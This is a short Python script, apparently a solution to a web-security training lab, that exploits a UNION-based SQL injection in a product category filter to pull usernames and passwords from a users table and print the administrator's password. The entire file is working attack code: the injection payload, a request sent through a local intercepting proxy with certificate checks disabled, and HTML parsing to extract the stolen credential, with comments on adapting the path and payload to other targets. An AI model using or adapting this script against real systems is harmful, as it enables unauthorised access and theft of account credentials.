import sys;
import requests;
import urllib3;
from bs4 import BeautifulSoup;

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def exploit_sqli_users_table(url):
    username = 'administrator' #chanege this to the username you want to find the password for
    path = "/filter?category=Pets" #change this path to the vulnerable path
    sql_payload = "' union select username, password from users--" #change this payload to get the data you want
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] found the administrator password!")
        soup = BeautifulSoup(r.text, 'html.parser')

        admin_password = soup.body.find(string="administrator")
        parent = admin_password.parent
        admin_password = parent.find_next('td').contents[0]
        print("[+] The administrator password is: '%s" %admin_password)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    print("Cross Checking a list of usernames and passwwords...")
    if not exploit_sqli_users_table(url):
        print("[-] Did not find any users table.")